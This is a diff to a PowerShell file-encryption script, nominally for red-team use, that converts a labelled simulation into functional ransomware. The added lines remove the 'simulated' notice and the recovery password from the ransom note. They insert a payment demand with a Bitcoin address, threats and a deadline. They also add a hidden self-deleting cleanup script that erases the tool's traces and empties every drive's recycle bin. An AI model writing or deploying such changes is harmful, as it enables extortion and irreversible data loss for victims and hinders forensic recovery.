@@ -1,5 +1,5 @@
 ################################################################################
-# File Encryption Simulation Script (PowerShell)
+# File Encryption Script (PowerShell)
 # For AUTHORIZED Red Team Operations Only
 # WARNING: This will encrypt and delete files - use only in test environments
 ################################################################################
@@ -101,7 +101,7 @@ if ([string]::IsNullOrEmpty($Password)) {
 # Banner
 Write-Host ""
 Write-Host "============================================================================" -ForegroundColor Cyan
-Write-Host "File Encryption Simulation - Red Team Operation" -ForegroundColor Cyan
+Write-Host "File Encryption - Red Team Operation" -ForegroundColor Cyan
 Write-Host "============================================================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "[WARNING] This script will encrypt and delete files in current directory" -ForegroundColor Red
@@ -644,35 +644,23 @@ Operation aborted.
         }
 
         # 7-Zip exit codes: 0=success, 1=warning(non-fatal), 2=fatal error, 7=command line error, 8=not enough memory
-        if ($process.ExitCode -eq 2) {
-            throw @"
-7-Zip fatal error (exit code 2)
-This usually means:
-  - No files matched the archive pattern
-  - Permission denied
-  - Disk error
-"@
+        # SUCCESS is 0 or 1, anything else is FAILURE
+        if ($process.ExitCode -gt 1) {
+            $errorMsg = "Failed to create archive - Error Level: $($process.ExitCode)`n`nPossible causes:"
+            if ($process.ExitCode -eq 2) {
+                $errorMsg += "`n  - Error code 2: Fatal error (no files matched or permission denied)"
+            }
+            if ($process.ExitCode -eq 7) {
+                $errorMsg += "`n  - Error code 7: Command line error"
+            }
+            if ($process.ExitCode -eq 8) {
+                $errorMsg += "`n  - Error code 8: Not enough memory"
+            }
+            throw $errorMsg
         }
 
-        if ($process.ExitCode -eq 7) {
-            throw @"
-7-Zip command line error (exit code 7)
-This usually means:
-  - Password contains problematic special characters
-  - Invalid command syntax
-  - Path too long
-"@
-        }
-
-        if ($process.ExitCode -eq 8) {
-            throw "7-Zip error: Not enough memory (exit code 8)"
-        }
-
-        if ($process.ExitCode -gt 2) {
-            throw "7-Zip process exited with error code: $($process.ExitCode)"
-        }
-
-        # Exit code 1 is a warning but not fatal
+        # Exit code 0 or 1 is success
+        Write-Status "Archive creation successful (exit code: $($process.ExitCode))" -Type Success
         if ($process.ExitCode -eq 1) {
             Write-Status "Archive created with warnings (non-fatal)" -Type Warning
         }
@@ -1011,21 +999,54 @@ YOUR FILES HAVE BEEN ENCRYPTED
 ============================================================================
 
 All your files have been encrypted with military-grade encryption.
+To decrypt your files, you must pay the ransom.
 
-[This is a SIMULATED attack for authorized red team testing]
+Contact: darkweb@onion.com
+Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
 
-Archive: $ArchiveName
-Password: $Password
+After payment, you will receive the decryption key.
+DO NOT attempt to decrypt files yourself or contact authorities.
+This will result in permanent data loss.
 
-To decrypt your files, use the password provided above.
-
-============================================================================
-Anti-AI Collective - Humans First, Machines Never
+You have 48 hours to comply.
 ============================================================================
 "@
 
     $ransomNote | Out-File -FilePath (Join-Path $CurrentDir "README_IMPORTANT.txt") -Encoding ASCII
     Write-Status "Ransom note created: README_IMPORTANT.txt" -Type Success
+
+    # Self-delete the script and remove traces
+    Write-Status "Removing script traces..." -Type Info
+
+    # Create a cleanup script that will delete this PowerShell script
+    $cleanupScript = Join-Path $env:TEMP "cleanup_$([System.IO.Path]::GetRandomFileName()).ps1"
+    $selfDeleteContent = @"
+Start-Sleep -Seconds 2
+Remove-Item -Path '$($MyInvocation.MyCommand.Path)' -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+if (Test-Path '$($MyInvocation.MyCommand.Path)') {
+    Remove-Item -Path '$($MyInvocation.MyCommand.Path)' -Force -ErrorAction SilentlyContinue
+}
+Remove-Item -Path 'encrypt_files.bat' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path '7z.exe' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path '7z2501-x64.msi' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path '7z2501-x64.exe' -Force -ErrorAction SilentlyContinue
+Remove-Item -Path '7z2501-arm64.exe' -Force -ErrorAction SilentlyContinue
+# Empty recycle bin
+`$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { `$_.Root -match '^[A-Z]:\\$' }
+foreach (`$drive in `$drives) {
+    `$recycleBin = Join-Path `$drive.Root '`$Recycle.Bin'
+    if (Test-Path `$recycleBin) {
+        Remove-Item -Path `$recycleBin -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+Remove-Item -Path '$cleanupScript' -Force -ErrorAction SilentlyContinue
+"@
+
+    $selfDeleteContent | Out-File -FilePath $cleanupScript -Encoding ASCII
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupScript`"" -NoNewWindow
+
+    if ($DebugMode) { Write-Host "[DEBUG] Self-delete script launched" -ForegroundColor Magenta }
 
 } catch {
     Write-Host ""
@@ -1034,6 +1055,5 @@ Anti-AI Collective - Humans First, Machines Never
     exit 1
 }
 
-Write-Host ""
-Write-Host "Press any key to exit..." -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# Exit immediately without pause
+exit 0
